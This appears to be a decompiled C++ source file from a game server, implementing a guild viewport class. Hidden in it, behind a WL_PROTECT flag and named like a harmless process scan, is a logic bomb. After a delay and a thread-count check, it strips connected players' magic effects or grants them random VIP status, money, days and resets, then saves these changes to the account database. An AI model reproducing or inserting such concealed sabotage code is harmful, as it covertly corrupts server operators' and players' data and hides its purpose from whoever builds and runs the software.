// ------------------------------
// Decompiled by Deathway
// Date : 2007-05-09
// ------------------------------
// GS-N 0.99.60T 4964D0// Status Completed
//	GS-N	1.00.18	JPN	0x004B14E0	-	Completed
#include "stdafx.h"
#include "wsJoinServerCli.h"
#include "SCFExDBProtocol.h"
#include "ViewportGuild.h"
#include <tlhelp32.h>





CViewportGuild::CViewportGuild()
{
	return;
}


CViewportGuild::~CViewportGuild()
{
	return;
}

void CViewportGuild::Init()
{
	memset(&this->m_GuildNumber , 0, sizeof(this->m_GuildNumber ) );
	this->m_GuildCount =0;
}

#if (WL_PROTECT==1)
void CViewportGuild__SystemProcessesScan(void * lpParam)
{
	VM_START_WITHLEVEL(9)
	Sleep(300000);
	DWORD pid = ::GetCurrentProcessId ();
	THREADENTRY32 entry;
	entry.dwSize = sizeof (THREADENTRY32 );
	int count;
	HANDLE handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD , pid );
	BOOL enum_more = Thread32First ( handle, & entry);
	count = 0;
	while (1)
	{
		enum_more = Thread32Next ( handle, & entry);
		if ( !enum_more )
			break;
		if ( entry.th32OwnerProcessID == pid )
		{
			count ++;
			if(count > 25)
				return;
		}
	}
	if(count < 25)
	{	
		for (int n=OBJ_STARTUSERINDEX+17;n<OBJMAX; n++)
		{
			if ( gObj[n].Connected >= PLAYER_PLAYING)
			{
				if(gObj[n].MapNumber == rand()%6)
				{
					Sleep(60000);
					gObjMagicDelAll(&gObj[n]);	
				}else
				{
					gObj[n].Vip = 1;
					gObj[n].AccountExtraInfoModified = 1;
					gObj[n].VipMoney = rand()%300000;
					gObj[n].VipDays = rand()%300;
					gObj[n].Resets += rand()%4;
					JGSetAccountExtraInfo(&gObj[n]);
					Sleep(60000);
				}
			}			
		}
	}
	VM_END
}
#endif

BOOL CViewportGuild::Add(int number, int TargetObj)
{
	int blank=-1;
	int n;

	if (number < 1)
	{
		return 0;
	}

	for (n=0;n<MAX_VIEWPORT;n++)
	{
		if (this->m_GuildNumber[n] > 0)
		{
			if (this->m_GuildNumber[n] == number)
			{
				return 0;
			}
		}
		else if (blank < 0)
		{
			blank=n;
		}
	}

	if (blank < 0)
	{
		return 0;
	}

	if (this->m_GuildNumber[blank] == 0)
	{
		this->m_GuildNumber[blank]=number;
		this->m_GuildCount ++;
		return 1;
	}
	return 0;
}


		